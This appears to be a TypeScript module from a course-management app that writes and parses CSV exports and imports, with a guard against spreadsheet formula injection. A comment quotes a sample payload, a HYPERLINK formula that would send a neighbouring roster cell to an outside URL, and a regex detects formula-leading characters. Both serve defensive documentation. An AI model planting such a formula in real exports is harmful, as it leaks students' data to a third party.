/**
 * Text a spreadsheet cannot misread, and cannot execute.
 *
 * **Two separate problems, and only one of them is about formatting.**
 *
 * Quoting is the CSV one: a comma, a quote, a newline, or an edge space would otherwise split or
 * shift a field, and a student who put a comma in their display name would push their whole row one
 * column to the right. Doubling the quote and wrapping is RFC 4180.
 *
 * The leading apostrophe is the other, and it is a security fix. Excel and Google Sheets evaluate
 * any cell beginning `=`, `+`, `-`, or `@` as a formula when the file is opened — so a display name
 * of `=HYPERLINK("http://…"&A2)` runs on an instructor's machine against the roster sitting beside
 * it. Quoting alone does not stop this; both spreadsheets parse the formula out of a quoted field.
 * The apostrophe is what makes it literal text, and it is applied only to fields that are text, so
 * a negative number is untouched.
 *
 * **This file exists because there are now two exports.** The gradebook wrote these three functions
 * for itself; attendance needs them too, and its most dangerous field is worse — a note a fellow
 * typed about why they missed a morning, which no instructor reviewed before it reached the file.
 * A guard against formula injection has to exist exactly once, or the second copy is the one that
 * falls behind.
 *
 * Pure and browser-safe, in the manner of `lib/people.ts`: both exports build their file from the
 * payload already on screen rather than from a second query, so the file and the page cannot
 * disagree.
 */

import { displayNameOf } from "@/lib/people";

const NEEDS_QUOTING = /[",\r\n]|^\s|\s$/;
const READS_AS_FORMULA = /^[=+\-@\t\r]/;

export function csvText(value: string): string {
  const literal = READS_AS_FORMULA.test(value) ? `'${value}` : value;
  return NEEDS_QUOTING.test(literal) ? `"${literal.replace(/"/g, '""')}"` : literal;
}

/** One record. Numbers pass through unquoted so they arrive as numbers; null is an empty cell. */
export function csvLine(fields: readonly (string | number | null)[]): string {
  return fields
    .map((field) => {
      if (field == null) return "";
      return typeof field === "number" ? String(field) : csvText(field);
    })
    .join(",");
}

/**
 * A CSV back into rows of fields: RFC 4180, and nothing more.
 *
 * **The reading half of this file, which until now only wrote.** Both exports assemble a file
 * from a payload; importing CodeSignal's GCF results is the first thing that has to take one
 * apart. Putting the two in one file is what makes them checkable against each other — a
 * round-trip test proves the parser reads exactly what `csvLine` writes, which is the only real
 * guarantee that either is right.
 *
 * **Not a library.** The format is fixed by a standard rather than by a vendor, this is forty
 * lines, and the alternative is a runtime dependency for a page that runs in the browser.
 *
 * What it handles, because a real export contains all of it: fields wrapped in quotes, a doubled
 * quote standing for a literal one, commas and newlines *inside* a quoted field, and either line
 * ending. A trailing newline produces no extra row.
 *
 * What it deliberately does not do is strip the leading apostrophe `csvText` adds. That apostrophe
 * is a spreadsheet's escape rather than part of the value, but a file this parser reads was
 * written by somebody else, and guessing that a leading apostrophe was ours would corrupt a value
 * that genuinely starts with one.
 */
export function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  // Distinguishes a genuinely empty trailing line from a row that ended mid-field.
  let started = false;

  const endField = () => {
    row.push(field);
    field = "";
  };
  const endRow = () => {
    endField();
    rows.push(row);
    row = [];
    started = false;
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i]!;

    if (quoted) {
      if (char !== '"') {
        field += char;
        continue;
      }
      // A doubled quote is one literal quote; a single one closes the field.
      if (text[i + 1] === '"') {
        field += '"';
        i += 1;
        continue;
      }
      quoted = false;
      continue;
    }

    if (char === '"' && field === "") {
      quoted = true;
      started = true;
      continue;
    }

    if (char === ",") {
      endField();
      started = true;
      continue;
    }

    if (char === "\r") continue;

    if (char === "\n") {
      // A blank line between records is skipped rather than becoming a row of one empty field,
      // which would otherwise reach the caller as a record with every column missing.
      if (started || row.length > 0 || field !== "") endRow();
      continue;
    }

    field += char;
    started = true;
  }

  if (started || row.length > 0 || field !== "") endRow();

  return rows;
}

/**
 * A CSV as records keyed by its own header row.
 *
 * **Keyed by name rather than by position**, which is the whole reason it exists: CodeSignal's
 * export has thirty columns and no promise about their order, so a reader that counted would
 * break silently the day one is inserted — and silently is the word, because column 17 of 30
 * still parses as a number, just the wrong one.
 *
 * A row with fewer fields than the header yields empty strings for the rest rather than
 * `undefined`, so every caller reads a string and none has to test for a missing key.
 *
 * The BOM Excel writes at the start of a file is stripped, or the first column's name would be
 * `﻿Assessment ID` and every lookup against it would miss.
 */
export function parseCsvRecords(text: string): Record<string, string>[] {
  const rows = parseCsv(text.replace(/^﻿/, ""));
  const header = rows[0];
  if (!header) return [];

  return rows
    .slice(1)
    .map((fields) => Object.fromEntries(header.map((name, index) => [name, fields[index] ?? ""])));
}

/**
 * Whatever this person is best called, and whether they are real.
 *
 * The badge a screen draws beside a seeded student has to survive into the file, because the file
 * is where it matters most: a test row on screen is marked, and the same row in a spreadsheet of
 * cohort results is indistinguishable from somebody who has fallen behind. In words rather than a
 * column of its own, since that is what the screens do — the mark belongs to the name.
 */
export function csvPersonName(
  person: {
    displayName: string | null;
    email: string | null;
    githubUsername: string | null;
    testStudentNumber: number | null;
  },
  fallback: string,
): string {
  const name = displayNameOf(person, fallback);
  return person.testStudentNumber === null ? name : `${name} (test student)`;
}
